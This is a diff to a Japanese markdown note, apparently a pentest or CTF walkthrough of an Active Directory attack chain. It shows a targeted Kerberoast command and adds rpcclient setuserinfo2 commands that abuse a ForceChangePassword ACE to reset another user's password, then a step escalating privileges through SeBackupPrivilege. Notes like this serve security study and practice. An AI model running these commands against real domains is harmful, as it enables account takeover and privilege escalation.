@@ -47,4 +47,11 @@ id   name               password
 python3 targetedKerberoast.py -v -d '<domain>' -u '<username>' -p '<pw>'
 ```
 
-8. Kerberoastして侵害したユーザーが、ほかユーザーオブジェクトに対してForceChangePassword ACEをもっていたため、パスワードを変更（[[💥AD Exploit#ForceChangePassword]]
+8. Kerberoastして侵害したユーザーが、ほかユーザーオブジェクトに対してForceChangePassword ACE をもっていたため、パスワードを変更（[[💥AD Exploit#ForceChangePassword]]）
+```sh
+rpcclient //<TargetIP> -U <domain>/<username>
+# rpcclient $>プロンプトで
+setuserinfo2 <username> 23 '<new_pw>'
+```
+
+9. パスワードを変更して侵害したユーザーが Tier 0 のユーザーであったため、RDP 接続し、PowerShell を Run as Administrator してSeBackupPrivilegeがあったため、権限昇格
